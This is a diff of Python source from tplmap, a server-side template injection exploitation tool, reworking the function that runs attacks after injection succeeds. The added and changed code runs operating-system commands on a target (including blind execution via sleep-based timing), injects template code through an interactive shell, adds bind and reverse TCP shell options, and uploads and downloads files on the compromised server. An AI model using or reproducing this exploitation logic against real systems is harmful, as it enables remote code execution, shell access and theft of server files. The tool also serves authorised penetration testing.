@@ -81,49 +81,77 @@ def check_template_injection(channel):
     # If actions are not required, prints the advices and exit
     if not any(
             f for f,v in channel.args.items() if f in (
-                'os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell'
+                'os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell', 'tpl_code', 'reverse_tcp_shell'
             ) and v
         ):
 
         log.info(
-            """Rerun tplmap providing one of the following options:%(execute)s%(write)s%(read)s""" % (
+            """Rerun tplmap providing one of the following options:%(execute)s%(write)s%(read)s%(tpl_shell)s%(reverse_tpl_shell)s""" % (
                 {
-                 'execute' : '\n    --os-cmd or --os-shell to access the underlying operating system' if channel.data.get('execute') else '',
-                 'write' : '\n    --upload LOCAL REMOTE to upload files to the server' if channel.data.get('write') else '',
-                 'read' : '\n    --download REMOTE LOCAL to download remote files' if channel.data.get('read') else ''
+                 'execute': '\n    --os-cmd or --os-shell to access the underlying operating system' if channel.data.get('execute') else '',
+                 'write': '\n    --upload LOCAL REMOTE to upload files to the server' if channel.data.get('write') else '',
+                 'read': '\n    --download REMOTE LOCAL to download remote files' if channel.data.get('read') else '',
+                 'tpl_shell': '\n    --tcp-shell PORT to run an out-of-bound TCP shell on the remote PORT and connect to it' if channel.data.get('tpl_shell') else '',
+                 'reverse_tpl_shell': '\n    --reverse-tcp-shell HOST PORT to run a system shell and connect back to local HOST PORT' if channel.data.get('reverse_tpl_shell') else '',
                  }
             )
         )
 
         return
 
-    # Execute operating system commands
-    if channel.data.get('execute'):
-
-        if channel.args.get('os_cmd'):
-            print current_plugin.execute(channel.args.get('os_cmd'))
-        elif channel.args.get('os_shell'):
-            log.info('Run commands on the operating system.')
-
-            Shell(current_plugin.execute, '%s $ ' % (channel.data.get('os', ''))).cmdloop()
-
 
     # Execute operating system commands
-    if channel.data.get('engine'):
+    if channel.args.get('os_cmd') or channel.args.get('os_shell'):
 
-        if channel.args.get('tpl_code'):
-            print current_plugin.inject(channel.args.get('os_cmd'))
-        elif channel.args.get('tpl_shell'):
-            log.info('Inject multi-line template code. Press ctrl-D to send the lines.')
+        # Check the status of command execution capabilities
+        if channel.data.get('execute_blind'):
+            log.info("""Only blind injection has been found.""")
+            log.info("""Commands are executed as '<command> && sleep <delay>' and return True or False whether the delay has been triggered or not.""")
 
-            MultilineShell(current_plugin.inject, '%s $ ' % (channel.data.get('engine', ''))).cmdloop()
+            if channel.args.get('os_cmd'):
+                print current_plugin.execute_blind(channel.args.get('os_cmd'))
+            elif channel.args.get('os_shell'):
+                log.info('Run commands on the operating system')
+                Shell(current_plugin.execute_blind, '%s (blind) $ ' % (channel.data.get('os', ''))).cmdloop()
 
-    # Perform file write
-    if channel.data.get('write'):
+        elif channel.data.get('execute'):
+            if channel.args.get('os_cmd'):
+                print current_plugin.execute(channel.args.get('os_cmd'))
+            elif channel.args.get('os_shell'):
+                log.info('Run commands on the operating system')
 
-        local_remote_paths = channel.args.get('upload')
+                Shell(current_plugin.execute, '%s $ ' % (channel.data.get('os', ''))).cmdloop()
 
-        if local_remote_paths:
+        else:
+            log.error('No system command execution capabilities have been detected on the target')
+
+
+    # Execute template commands
+    if channel.args.get('tpl_code') or channel.args.get('tpl_shell'):
+
+        if channel.data.get('engine'):
+
+            if channel.data.get('blind'):
+                log.info("""Only blind execution has been found. The injected template code will no return any output.""")
+                call = current_plugin.inject
+            else:
+                call = current_plugin.render
+
+            if channel.args.get('tpl_code'):
+                print call(channel.args.get('tpl_code'))
+            elif channel.args.get('tpl_shell'):
+                log.info('Inject multi-line template code. Press ctrl-D to send the lines')
+                MultilineShell(call, '%s > ' % (channel.data.get('engine', ''))).cmdloop()
+
+        else:
+                log.error('No code evaluation capabilities have been detected on the target')
+
+
+    # Perform file upload
+    local_remote_paths = channel.args.get('upload')
+    if local_remote_paths:
+
+        if channel.data.get('write'):
 
             local_path, remote_path = local_remote_paths
 
@@ -132,12 +160,14 @@ def check_template_injection(channel):
 
             current_plugin.write(data, remote_path)
 
+        else:
+                log.error('No file upload capabilities have been detected on the target')
+
     # Perform file read
-    if channel.data.get('read'):
+    remote_local_paths = channel.args.get('download')
+    if remote_local_paths:
 
-        remote_local_paths = channel.args.get('download')
-
-        if remote_local_paths:
+        if channel.data.get('read'):
 
             remote_path, local_path = remote_local_paths
 
@@ -145,3 +175,7 @@ def check_template_injection(channel):
 
             with open(local_path, 'wb') as f:
                 f.write(content)
+
+        else:
+
+            log.error('No file download capabilities have been detected on the target')
